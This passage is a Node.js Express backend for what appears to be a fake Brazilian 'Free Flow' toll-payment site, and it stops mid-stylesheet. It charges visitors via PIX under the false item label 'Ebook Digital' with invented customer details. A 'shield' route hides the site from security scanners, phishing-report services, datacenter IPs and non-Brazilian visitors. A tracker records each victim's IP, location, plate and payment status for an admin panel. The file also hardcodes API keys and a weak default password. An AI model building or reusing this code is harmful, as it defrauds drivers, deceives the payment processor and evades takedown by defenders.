const express = require('express');
const cors = require('cors');

const app = express();

const ALLOWED_ORIGINS = [
    'https://www.freeflow-pedagio.site',
    'https://freeflow-pedagio.site',
    'https://api.freeflow-pedagio.site',
];

const INTERNAL_KEY = process.env.INTERNAL_KEY || 'fd-k9x2mq7v4n8p1w6j3t5r';

app.use(cors({
    origin: (origin, cb) => {
        if (!origin || ALLOWED_ORIGINS.includes(origin)) return cb(null, true);
        return cb(new Error('Not allowed'));
    },
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'X-Internal-Key'],
}));

app.use(express.json());
app.use(express.urlencoded({ extended: false }));

// Block direct browser access to API routes
function requireInternalKey(req, res, next) {
    const key = req.headers['x-internal-key'];
    if (key !== INTERNAL_KEY) {
        return res.status(403).json({ error: 'Forbidden' });
    }
    next();
}

const MANGOFY_API_KEY = process.env.MANGOFY_API_KEY || '2cb435b12f2f8431fbd9b7e1f0b34540e2axyl1axlbg34ckxjxaxvbyool0oen';
const MANGOFY_STORE_CODE = process.env.MANGOFY_STORE_CODE || 'd2b22f8faf5a2081e772328755ce7349';
const MANGOFY_API_URL = 'https://checkout.mangofy.com.br/api/v1';

// ---------- GERAR PIX ----------
app.post('/api/gerar_pix', requireInternalKey, async (req, res) => {
    const { valorTransacao, placa } = req.body || {};
    const valor = parseFloat(valorTransacao) || 0;
    const placaClean = (placa || '').toUpperCase().trim();

    if (valor <= 0 || !placaClean) {
        return res.status(400).json({ success: false, error: 'Dados inválidos' });
    }

    const valorCentavos = Math.round(valor * 100);
    if (valorCentavos < 500) {
        return res.status(400).json({ success: false, error: 'Valor mínimo é R$ 5,00' });
    }

    const payload = {
        payment_method: 'pix',
        payment_format: 'regular',
        installments: 1,
        payment_amount: valorCentavos,
        postback_url: (process.env.RAILWAY_PUBLIC_DOMAIN
            ? 'https://' + process.env.RAILWAY_PUBLIC_DOMAIN
            : 'https://localhost:3000') + '/api/webhook',
        external_code: 'PED_' + Math.random().toString(36).substring(2,10).toUpperCase() + '_' + Date.now(),
        items: [{
            code: 'EBOOK_' + Date.now(),
            name: 'Ebook Digital',
            amount: valorCentavos,
            total: 1,
        }],
        customer: {
            email: 'user_' + Math.random().toString(36).substring(2,10) + '@gmail.com',
            name: 'Cliente #' + Math.random().toString(36).substring(2,8).toUpperCase(),
            document: '00000000000',
            phone: '11999999999',
            ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || '177.70.100.1',
        },
        pix: { expires_in_days: 1 },
    };

    try {
        const response = await fetch(MANGOFY_API_URL + '/payment', {
            method: 'POST',
            headers: {
                'Authorization': MANGOFY_API_KEY,
                'Store-Code': MANGOFY_STORE_CODE,
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            },
            body: JSON.stringify(payload),
        });

        const data = await response.json();

        if (response.ok && data.payment_code) {
            const pix = data.pix || data.checkout || {};
            const qrcode = pix.pix_qrcode_text || pix.qr_code || pix.qrcode || pix.emv || pix.brcode || pix.code
                || data.qr_code || data.qrcode || data.emv || data.brcode || '';
            const qrcodeBase64 = pix.qr_code_base64 || pix.qrcode_base64 || pix.image || pix.base64
                || data.qr_code_base64 || data.qrcode_base64 || data.image || '';

            return res.json({
                success: true,
                transaction_id: data.payment_code,
                qrcode,
                qrcode_base64: qrcodeBase64,
                valor,
            });
        }

        return res.status(400).json({
            success: false,
            error: data.message || data.error || 'Erro ao gerar PIX',
        });
    } catch (e) {
        return res.status(500).json({ success: false, error: 'Erro de conexão com gateway' });
    }
});

// ---------- CONSULTAR STATUS ----------
app.post('/api/consultar_status_pix', requireInternalKey, async (req, res) => {
    const { transaction_id } = req.body || {};
    const paymentCode = (transaction_id || '').trim();

    if (!paymentCode) {
        return res.status(400).json({ success: false, error: 'transaction_id é obrigatório' });
    }

    try {
        const response = await fetch(MANGOFY_API_URL + '/payment/' + encodeURIComponent(paymentCode), {
            headers: {
                'Authorization': MANGOFY_API_KEY,
                'Store-Code': MANGOFY_STORE_CODE,
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            },
        });

        const data = await response.json();

        if (response.ok && data) {
            const statusMap = { approved: 'paid', pending: 'pending', refunded: 'refunded', error: 'error' };
            const status = statusMap[data.payment_status] || 'pending';
            return res.json({
                success: true,
                status,
                paid_at: data.payment_status === 'approved' ? (data.approved_at || new Date().toISOString()) : null,
            });
        }

        return res.json({ success: true, status: 'pending', paid_at: null });
    } catch (e) {
        return res.json({ success: true, status: 'pending', paid_at: null });
    }
});

// ---------- VEICULOS ----------
app.get('/api/veiculos', requireInternalKey, async (req, res) => {
    const placa = (req.query.placa || '').toUpperCase().trim();

    if (!placa || !/^[A-Z]{3}[0-9][A-Z0-9][0-9]{2}$/.test(placa)) {
        return res.status(400).json({ success: false, error: 'Placa inválida' });
    }

    try {
        const response = await fetch('https://www.achecar.com.br/api/free-lookup', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Origin': 'https://www.achecar.com.br',
                'Referer': 'https://www.achecar.com.br/consulta-gratuita',
            },
            body: JSON.stringify({ plate: placa }),
        });

        if (!response.ok) return res.status(502).json({ success: false, error: 'Consulta falhou' });

        const data = await response.json();
        if (!data.brand && !data.model) return res.status(404).json({ success: false, error: 'Não encontrado' });

        return res.json({
            success: true,
            veiculo: {
                marca: data.brand || '', modelo: data.model || '', descricao: data.brandModel || '',
                ano: data.year || '', anoModelo: data.yearModel || '', cor: data.color || '',
                combustivel: data.fuel || '', tipo: data.vehicleType || '',
                cidade: data.city || '', estado: data.state || '', potencia: data.power || '',
                nacionalidade: data.nationality || '',
            },
        });
    } catch (e) {
        return res.status(500).json({ success: false, error: 'Erro de conexão' });
    }
});

// ---------- PERSISTENT STORAGE (GitHub-backed) ----------
const fs = require('fs');
const DATA_FILE = '/tmp/freeflow-events.json';

// GitHub storage config — set GITHUB_TOKEN + GITHUB_REPO in Railway env vars
const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
const GITHUB_REPO  = process.env.GITHUB_REPO  || '';  // ex: 'retzzzz/freeflow-data'
const GH_FILE      = 'events.json';
const GH_HEADERS   = () => ({
    Authorization: `Bearer ${GITHUB_TOKEN}`,
    Accept: 'application/vnd.github+json',
    'Content-Type': 'application/json',
    'User-Agent': 'freeflow-api',
});

let _ghSha     = null;   // SHA do arquivo no GitHub (necessário para atualizar)
let _ghSaving  = false;  // mutex: evita saves concorrentes
let _ghPending = false;  // flag: novo save aguardando enquanto outro roda

async function ghLoad() {
    if (!GITHUB_TOKEN || !GITHUB_REPO) return null;
    try {
        const r = await fetch(`https://api.github.com/repos/${GITHUB_REPO}/contents/${GH_FILE}`, {
            headers: GH_HEADERS(),
        });
        if (r.status === 404) { _ghSha = null; return []; }
        if (!r.ok) { console.log('[GH] Load HTTP', r.status); return null; }
        const d = await r.json();
        _ghSha = d.sha;
        const raw = Buffer.from(d.content.replace(/\n/g, ''), 'base64').toString('utf8');
        return JSON.parse(raw);
    } catch(e) { console.log('[GH] Load error:', e.message); return null; }
}

async function ghSave(snapshot) {
    if (!GITHUB_TOKEN || !GITHUB_REPO) return;
    if (_ghSaving) { _ghPending = true; return; }
    _ghSaving = true;
    try {
        const content = Buffer.from(JSON.stringify(snapshot)).toString('base64');
        const body    = { message: 'update events', content, branch: 'main' };
        if (_ghSha) body.sha = _ghSha;

        const r = await fetch(`https://api.github.com/repos/${GITHUB_REPO}/contents/${GH_FILE}`, {
            method: 'PUT',
            headers: GH_HEADERS(),
            body: JSON.stringify(body),
        });

        if (r.status === 409) {
            // SHA conflito: recarregar SHA e tentar de novo
            console.log('[GH] SHA conflict, refreshing SHA...');
            const fresh = await ghLoad();
            if (fresh !== null && _ghSha) {
                const r2 = await fetch(`https://api.github.com/repos/${GITHUB_REPO}/contents/${GH_FILE}`, {
                    method: 'PUT',
                    headers: GH_HEADERS(),
                    body: JSON.stringify({ message: 'update events (retry)', content, branch: 'main', sha: _ghSha }),
                });
                if (r2.ok) { const d2 = await r2.json(); _ghSha = d2.content?.sha || _ghSha; }
            }
        } else if (r.ok) {
            const d = await r.json();
            _ghSha = d.content?.sha || _ghSha;
        } else {
            console.log('[GH] Save HTTP', r.status);
        }
    } catch(e) { console.log('[GH] Save error:', e.message); }
    _ghSaving = false;
    if (_ghPending) { _ghPending = false; ghSave([...events]); }
}

let events = [];

// 1) Carrega /tmp imediatamente (sobrevive restarts curtos)
try {
    if (fs.existsSync(DATA_FILE)) {
        const raw = fs.readFileSync(DATA_FILE, 'utf8');
        events = JSON.parse(raw);
        console.log('[BOOT] Loaded', events.length, 'events from /tmp');
    }
} catch(e) { events = []; }

// 2) Carrega GitHub (fonte autoritativa, sobrevive deploys)
ghLoad().then(ghData => {
    if (ghData === null) { console.log('[GH] Skipped (no token/repo configured)'); return; }
    if (ghData.length >= events.length) {
        // GitHub tem dados mais completos — usa GitHub
        events = ghData;
        console.log('[BOOT] GitHub authoritative:', events.length, 'events loaded');
        try { fs.writeFileSync(DATA_FILE, JSON.stringify(events), 'utf8'); } catch(_) {}
    } else if (events.length > 0) {
        // /tmp tem mais dados (ex: crash antes de sincronizar) — sobe /tmp → GitHub
        console.log('[BOOT] Syncing /tmp →  GitHub (', events.length, 'events)');
        ghSave([...events]);
    }
}).catch(e => console.log('[GH] Boot error:', e.message));

function saveEvents() {
    // Síncrono: /tmp (rápido, cache local)
    try { fs.writeFileSync(DATA_FILE, JSON.stringify(events), 'utf8'); } catch(_) {}
    // Assíncrono: GitHub (persistente, não bloqueia request)
    ghSave([...events]).catch(() => {});
}

// ---------- SHIELD (Anti-bot / Geo-block / Datacenter) ----------

const geoCache = new Map();
const GEO_TTL = 3600000; // 1h cache

const BOT_UA = [
    'bot','crawler','spider','scraper','scan','check','monitor',
    'curl','wget','python','go-http','java/','perl/','ruby','php/',
    'phantom','headless','puppeteer','playwright','selenium','webdriver',
    'googlebot','bingbot','yandex','baidu','duckduck',
    'facebookexternalhit','twitterbot','linkedinbot','slackbot','telegrambot','whatsapp',
    'barracuda','proofpoint','symantec','forcepoint','mimecast',
    'safelinks','safebrowsing','phishtank','url protection','urldefense',
    'messagelabs','spamhaus','fortiguard','websense',
    'semrush','ahrefs','majestic','moz.com','bytespider',
    'censys','shodan','nmap','nikto','sqlmap','masscan',
    'postman','insomnia','httpie','axios/','node-fetch','undici',
    'preview','archiv','dispatch','applebot','petalbot',
    'mail.ru','seznam','sogou','exabot','ia_archiver',
];

const DC_ISP = [
    'amazon','aws','ec2','google cloud','gcp','microsoft','azure',
    'digitalocean','ovh','hetzner','linode','akamai','vultr',
    'oracle cloud','cloudflare','contabo','hostgator','godaddy',
    'bluehost','rackspace','scaleway','upcloud','kamatera',
    'leaseweb','cogent','choopa','serverius','quadranet','psychz',
    'colocrossing','hostwinds','ionos','fastly','incapsula',
    'sucuri','stackpath','m247','datacamp','zscaler',
    'fortinet','palo alto','barracuda networks',
];

function isBotUA(ua) {
    const l = (ua || '').toLowerCase();
    if (!l || l.length < 15) return true; // UA vazio ou muito curto = bot
    return BOT_UA.some(p => l.includes(p));
}

function isDCProvider(isp, org) {
    const c = ((isp || '') + ' ' + (org || '')).toLowerCase();
    return DC_ISP.some(p => c.includes(p));
}

async function getGeo(ip) {
    if (!ip || ip === '127.0.0.1' || ip === '::1') return null;
    const cached = geoCache.get(ip);
    if (cached && Date.now() - cached.ts < GEO_TTL) return cached.data;
    try {
        const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp,org,hosting`);
        if (!r.ok) return null;
        const data = await r.json();
        if (data.status === 'fail') return null;
        geoCache.set(ip, { data, ts: Date.now() });
        // Limpar cache antigo
        if (geoCache.size > 10000) {
            const old = [...geoCache.entries()].sort((a, b) => a[1].ts - b[1].ts).slice(0, 5000);
            old.forEach(([k]) => geoCache.delete(k));
        }
        return data;
    } catch(_) { return null; }
}

app.get('/api/shield', requireInternalKey, async (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
    const ua = req.headers['user-agent'] || '';

    // 1. Bot User-Agent
    if (isBotUA(ua)) return res.json({ ok: false, r: 'ua' });

    // 2. Geo — só Brasil
    const geo = await getGeo(ip);
    if (!geo) return res.json({ ok: true }); // Fail-open se geo falhar
    if (geo.countryCode !== 'BR') return res.json({ ok: false, r: 'geo' });

    // 3. Datacenter / hosting provider
    if (geo.hosting === true) return res.json({ ok: false, r: 'dc' });
    if (isDCProvider(geo.isp, geo.org)) return res.json({ ok: false, r: 'dc' });

    res.json({ ok: true });
});

// ---------- WEBHOOK ----------
app.post('/api/webhook', (req, res) => {
    const data = req.body || {};
    const code = data.payment_code || '';
    if (data.payment_status === 'approved' && code) {
        const ev = events.find(e => e.pixCode === code);
        if (ev) { ev.status = 'pago'; ev.pagoEm = ev.pagoEm || new Date().toISOString(); saveEvents(); }
    }
    res.json({ received: true });
});

// ---------- TRACKING ----------

function spTime(iso) {
    return new Date(iso).toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo', hour12: false });
}
function isMobile(ua) {
    return /android|iphone|ipad|ipod|mobile|phone/i.test(ua);
}

function findSession(ip, placa) {
    // Match by placa first (most precise), then by IP within last 2h
    if (placa) {
        const byPlaca = events.find(e => e.placa === placa);
        if (byPlaca) return byPlaca;
    }
    const cutoff = Date.now() - 2 * 60 * 60 * 1000;
    return events.find(e => e.ip === ip && new Date(e.criadoEm).getTime() > cutoff) || null;
}

app.post('/api/track', async (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
    const ua = req.headers['user-agent'] || '';
    const { tipo, placa, valor, pixCode, utm } = req.body || {};
    const now = new Date().toISOString();

    let session = findSession(ip, placa || '');

    if (!session) {
        // Usa getGeo cacheado (compartilha cache com shield)
        const geo = await getGeo(ip) || {};

        session = {
            id: Date.now() + Math.random(),
            ip,
            ua,
            mobile: isMobile(ua),
            pais: geo.country || '',
            estado: geo.regionName || '',
            cidade: geo.city || '',
            isp: geo.isp || '',
            placa: placa || '',
            valor: null,
            pixCode: '',
            status: 'visita',
            utm: utm || {},
            visitaEm: now,
            consultouEm: null,
            pixGeradoEm: null,
            pagoEm: null,
            criadoEm: now,
            atualizadoEm: now,
        };
        events.unshift(session);
    }

    // Update session fields based on tipo
    if (placa) session.placa = placa;
    session.atualizadoEm = now;

    if (tipo === 'consultou') {
        session.consultouEm = session.consultouEm || now;
        session.status = 'consultou';
    } else if (tipo === 'pix_gerado') {
        session.pixGeradoEm = session.pixGeradoEm || now;
        session.valor = valor || session.valor;
        session.pixCode = pixCode || session.pixCode;
        session.status = 'pix_gerado';
    } else if (tipo === 'pago') {
        session.pagoEm = session.pagoEm || now;
        session.valor = valor || session.valor;
        session.pixCode = pixCode || session.pixCode;
        session.status = 'pago';
    }

    saveEvents();
    res.json({ ok: true });
});

// ---------- PAINEL ADMIN ----------
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Br@sil2019';
const ADMIN_TOKEN = Buffer.from('ff:' + ADMIN_PASSWORD).toString('base64');

function parseCookies(req) {
    const obj = {};
    (req.headers.cookie || '').split(';').forEach(c => {
        const [k, ...v] = c.trim().split('=');
        if (k) obj[k] = decodeURIComponent(v.join('='));
    });
    return obj;
}
function isAdmin(req) {
    return parseCookies(req).ff_admin === ADMIN_TOKEN;
}
function setAdminCookie(res) {
    res.setHeader('Set-Cookie', `ff_admin=${ADMIN_TOKEN}; Path=/painel; HttpOnly; SameSite=Strict; Max-Age=86400`);
}

app.post('/painel/login', (req, res) => {
    if ((req.body.senha || '').trim() !== ADMIN_PASSWORD) {
        return res.redirect('/painel?erro=1');
    }
    setAdminCookie(res);
    res.redirect('/painel');
});

app.get('/painel/logout', (req, res) => {
    res.setHeader('Set-Cookie', 'ff_admin=; Path=/painel; HttpOnly; SameSite=Strict; Max-Age=0');
    res.redirect('/painel');
});

app.get('/painel/export', (req, res) => {
    if (!isAdmin(req)) return res.status(403).send('Forbidden');
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', 'attachment; filename="eventos.json"');
    res.send(JSON.stringify(events, null, 2));
});

app.post('/painel/clear', (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Não autorizado' });
    events.length = 0;
    saveEvents();
    res.json({ ok: true });
});

app.get('/painel', (req, res) => {
    // --- LOGIN PAGE ---
    if (!isAdmin(req)) {
        const erro = req.query.erro === '1';
        return res.send(`<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Login — Admin</title>
<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',system-ui,sans-serif;background:#09090b;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.login-card{background:#18181b;border:1px solid #27272a;border-radius:16px;padding:48px 36px 40px;width:min(400px,100%);position:relative;overflow:hidden}
.login-card::before{content:'';position:absolute;top:-1px;left:50%;transform:translateX(-50%);width:120px;height:3px;background:linear-gradient(90deg,transparent,#6366f1,transparent);border-radius:0 0 4px 4px}
.lock-icon{width:48px;height:48px;border-radius:12px;background:#27272a;display:flex;align-items:center;justify-content:center;margin:0 auto 28px}
.lock-icon svg{color:#a1a1aa}
h1{font-size:20px;font-weight:700;color:#fafafa;text-align:center;margin-bottom:6px;letter-spacing:-0.3px}
.subtitle{font-size:13px;color:#71717a;text-align:center;margin-bottom:32px}
.field{position:relative;margin-bottom:20px}
.field svg{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:#52525b;pointer-events:none}
.field input{width:100%;background:#09090b;border:1px solid #27272a;border-radius:10px;padding:13px 14px 13px 42px;color:#fafafa;font-size:14px;font-family:inherit;outline:none;transition:border-color .2s}
.field input:focus{border-color:#6366f1;box-shadow:0 0 0 3px #6366f120}
.field input::placeholder{color:#52525b}
.btn{width:100%;background:#fafafa;color:#09090b;border:none;border-radius:10px;padding:13px;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;transition:all .15s}
.btn:hover{background:#e4e4e7;transform:translateY(-1px)}
.btn:active{transform:translateY(0)}
.err-msg{color:#ef4444;font-size:13px;text-align:center;margin-top:16px;display:${erro ? 'block' : 'none'}}
.footer{text-align:center;margin-top:28px;padding-top:20px;border-top:1px solid #27272a}
.footer span{font-size:11px;color:#3f3f46;letter-spacing:0.5px}
</style></head><body>
<div class="login-card">
  <div class="lock-icon">
    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="11" x="3" y="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
  </div>
  <h1>Acesso restrito</h1>
  <p class="subtitle">Painel de controle Free Flow</p>
  <form method="POST" action="/painel/login">
    <div class="field">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="11" x="3" y="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
      <input type="password" name="senha" placeholder="Senha de acesso" autocomplete="current-password" autocapitalize="none" autocorrect="off" spellcheck="false" autofocus required>
    </div>
    <button type="submit" class="btn">Entrar</button>
    <p class="err-msg">Senha incorreta. Tente novamente.</p>
  </form>
  <div class="footer"><span>FREE FLOW ADMIN</span></div>
</div>
</body></html>`);
    }

    // --- DASHBOARD ---
    const { page } = req.query;
    const PER_PAGE = 100;
    const currentPage = Math.max(1, parseInt(page) || 1);
    const totalPages = Math.max(1, Math.ceil(events.length / PER_PAGE));
    const pageEvents = events.slice((currentPage - 1) * PER_PAGE, currentPage * PER_PAGE);

    const total = events.length;
    const visitas = events.filter(e => e.visitaEm).length;
    const consultou = events.filter(e => e.consultouEm).length;
    const pixGerados = events.filter(e => e.pixGeradoEm).length;
    const pagamentos = events.filter(e => e.pagoEm).length;
    const uniqueIPs = new Set(events.map(e => e.ip)).size;
    const receita = events.filter(e => e.pagoEm && e.valor).reduce((s, e) => s + parseFloat(e.valor || 0), 0);
    const pct = (n, d) => d > 0 ? Math.round(n / d * 100) : 0;
    const brEvents = events.filter(e => e.pais === 'Brazil').length;
    const intEvents = total - brEvents;

    function statusBadge(s) {
        const map = {
            visita:      ['st-visit',  'Visita'],
            consultou:   ['st-search', 'Consultou'],
            pix_gerado:  ['st-pix',    'PIX Gerado'],
            pago:        ['st-paid',   'Pago'],
        };
        const [cls, label] = map[s] || ['st-visit', s];
        return '<span class="badge ' + cls + '">' + label + '</span>';
    }

    const rows = pageEvents.map(ev => {
        const loc = [ev.cidade, ev.estado].filter(Boolean).join(', ');
        const val = ev.valor ? 'R$ ' + parseFloat(ev.valor).toFixed(2).replace('.', ',') : '';
        const uaSafe = (ev.ua || '').replace(/</g, '&lt;');
        const isBr = ev.pais === 'Brazil';
        const deviceSvg = ev.mobile
            ? '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="14" height="20" x="5" y="2" rx="2"/><path d="M12 18h.01"/></svg>'
            : '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="20" height="14" x="2" y="3" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>';
        return '<tr data-status="' + ev.status + '" data-pais="' + (isBr ? 'br' : 'int') + '">'
            + '<td>' + spTime(ev.criadoEm) + '</td>'
            + '<td>' + statusBadge(ev.status) + '</td>'
            + '<td class="td-placa">' + (ev.placa || '<span class="muted">—</span>') + '</td>'
            + '<td class="td-val">' + (val || '<span class="muted">—</span>') + '</td>'
            + '<td>' + (ev.consultouEm ? spTime(ev.consultouEm) : '<span class="muted">—</span>') + '</td>'
            + '<td>' + (ev.pixGeradoEm ? spTime(ev.pixGeradoEm) : '<span class="muted">—</span>') + '</td>'
            + '<td>' + (ev.pagoEm ? spTime(ev.pagoEm) : '<span class="muted">—</span>') + '</td>'
            + '<td class="td-device" title="' + uaSafe + '">' + deviceSvg + ' ' + (ev.mobile ? 'Mobile' : 'Desktop') + '</td>'
            + '<td>' + (loc || '<span class="muted">—</span>') + '</td>'
            + '<td class="td-ip">' + ev.ip + '</td>'
            + '</tr>';
    }).join('');

    const pagerLinks = [];
    for (let i = 1; i <= totalPages; i++) {
        pagerLinks.push('<a href="/painel?page=' + i + '" class="pg' + (i === currentPage ? ' active' : '') + '">' + i + '</a>');
    }

    res.send(`<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Admin — Free Flow</title>
<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
<style>
:root{--bg:#09090b;--card:#18181b;--border:#27272a;--border2:#3f3f46;--t1:#fafafa;--t2:#a1a1aa;--t3:#71717a;--t4:#52525b;--accent:#6366f1;--accent2:#818cf8;--green:#22c55e;--green-bg:#052e16;--green-border:#14532d;--amber:#f59e0b;--amber-bg:#451a03;--amber-border:#78350f;--blue:#3b82f6;--blue-bg:#172554;--blue-border:#1e3a5f;--red:#ef4444;--red-bg:#450a0a;--red-border:#7f1d1d}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--t1);min-height:100vh;-webkit-font-smoothing:antialiased}

/* Header */
.header{display:flex;align-items:center;gap:16px;padding:16px 24px;border-bottom:1px solid var(--border);flex-wrap:wrap}
.header-brand{display:flex;align-items:center;gap:10px;flex:1;min-width:0}
.header-dot{width:8px;height:8px;border-radius:50%;background:var(--green);flex-shrink:0;box-shadow:0 0 8px #22c55e80}
.header-title{font-size:14px;font-weight:600;color:var(--t1);white-space:nowrap}
.header-actions{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.hdr-btn{display:inline-flex;align-items:center;gap:6px;padding:7px 14px;border-radius:8px;font-size:12px;font-weight:500;font-family:inherit;cursor:pointer;border:1px solid var(--border);background:var(--card);color:var(--t2);transition:all .15s;text-decoration:none;white-space:nowrap}
.hdr-btn:hover{background:var(--border);color:var(--t1)}
.hdr-btn svg{flex-shrink:0}
.hdr-btn.danger{color:var(--red);border-color:var(--red-border)}
.hdr-btn.danger:hover{background:var(--red-bg);color:#fca5a5}

/* Stats */
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:12px;padding:20px 24px}
.stat-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:20px}
.stat-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
.stat-label{font-size:12px;font-weight:500;color:var(--t3);text-transform:uppercase;letter-spacing:0.5px}
.stat-icon{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center}
.stat-icon.purple{background:#6366f115;color:var(--accent2)}
.stat-icon.blue{background:#3b82f615;color:var(--blue)}
.stat-icon.amber{background:#f59e0b15;color:var(--amber)}
.stat-icon.green{background:#22c55e15;color:var(--green)}
.stat-icon.red{background:#ef444415;color:var(--red)}
.stat-value{font-size:28px;font-weight:800;letter-spacing:-1px;line-height:1}
.stat-sub{display:inline-block;font-size:12px;font-weight:500;color:var(--t3);margin-left:6px;letter-spacing:0}

/* Toolbar */
.toolbar{display:flex;align-items:center;gap:10px;padding:12px 24px;border-top:1px solid var(--border);flex-wrap:wrap}
.tool-select{appearance:none;-webkit-appearance:none;background:var(--card) url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%2371717a' stroke-width='2'%3E%3Cpath d='m6 9 6 6 6-6'/%3E%3C/svg%3E") no-repeat right 10px center;border:1px solid var(--border);border-radius:8px;padding:8px 32px 8px 12px;color:var(--t2);font-size:12px;font-family:inherit;cursor:pointer;outline:none;transition:border-color .15s}
.tool-select:focus{border-color:var(--accent)}
.tool-btn{display:inline-flex;align-items:center;gap:6px;padding:8px 14px;border-radius:8px;font-size:12px;font-weight:500;font-family:inherit;cursor:pointer;border:1px solid var(--border);background:var(--card);color:var(--t3);transition:all .15s;white-space:nowrap}
.tool-btn:hover{background:var(--border);color:var(--t1)}
.tool-btn.active{border-color:var(--blue);color:var(--blue);background:var(--blue-bg)}
.tool-spacer{flex:1}

/* Table */
.table-wrap{overflow-x:auto;padding:0 24px 24px;-webkit-overflow-scrolling:touch}
table{width:100%;border-collapse:collapse;font-size:13px;min-width:900px}
thead{position:sticky;top:0;z-index:2}
th{background:var(--card);padding:10px 14px;text-align:left;color:var(--t3);font-weight:500;font-size:11px;text-transform:uppercase;letter-spacing:0.5px;border-bottom:1px solid var(--border);white-space:nowrap}
td{padding:12px 14px;border-bottom:1px solid var(--border);vertical-align:middle;white-space:nowrap;color:var(--t2)}
tr:hover td{background:#ffffff06}
.muted{color:var(--t4)}
.td-placa{font-weight:600;color:var(--t1);font-family:'SF Mono',SFMono-Regular,ui-monospace,monospace;font-size:12px;letter-spacing:0.5px}
.td-val{font-weight:600;color:var(--green)}
.td-device{color:var(--t3);white-space:nowrap}
.td-device svg{display:inline-block;vertical-align:middle;margin-right:4px}
.td-ip{font-family:'SF Mono',SFMono-Regular,ui-monospace,monospace;font-size:11px;color:var(--t4)}

/* Badges */
.badge{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;border-radius:6px;font-size:11px;font-weight:600;letter-spacing:0.2px}
.badge::before{content:'';width:6px;height:6px;border-radius:50%;flex-shrink:0}
.st-visit{background:var(--blue-bg);color:#93c5fd;border:1px solid var(--blue-border)}
.st-visit::before{background:var(--blue)}
.st-search{background:#042f2e;color:#5eead4;border:1px solid #115e59}
.st-search::before{background:#14b8a6}
.st-pix{background:var(--amber-bg);color:#fcd34d;border:1px solid var(--amber-border)}
.st-pix::before{background:var(--amber)}
.st-paid{background:var(--green-bg);color:#86efac;border:1px solid var(--green-border)}
.st-paid::before{background:var(--green)}

/* Pagination */
.pager{display:flex;gap:4px;padding:0 24px 24px}
.pg{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;border-radius:8px;font-size:13px;font-weight:500;color:var(--t3);text-decoration:none;border:1px solid transparent;transition:all .15s}
.pg:hover{background:var(--card);color:var(--t1);border-color:var(--border)}
.pg.active{background:var(--accent);color:#fff;border-color:var(--accent)}

/* Modal */
.modal-overlay{position:fixed;inset:0;background:#00000080;backdrop-filter:blur(4px);display:flex;align-items:center;justify-content:center;z-index:9999;padding:20px}
.modal-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:32px;width:min(420px,100%);box-shadow:0 24px 80px #00000060}
.modal-title{font-size:16px;font-weight:700;color:var(--t1);margin-bottom:8px}
.modal-desc{font-size:13px;color:var(--t3);margin-bottom:24px;line-height:1.5}
.modal-input{width:100%;background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:11px 14px;color:var(--t1);font-size:14px;font-family:inherit;outline:none;margin-bottom:16px;transition:border-color .15s}
.modal-input:focus{border-color:var(--accent)}
.modal-btns{display:flex;gap:10px}
.modal-btns button{flex:1;padding:11px;border-radius:8px;font-size:13px;font-weight:600;font-family:inherit;cursor:pointer;border:none;transition:all .15s}
.btn-cancel{background:var(--border);color:var(--t2)}
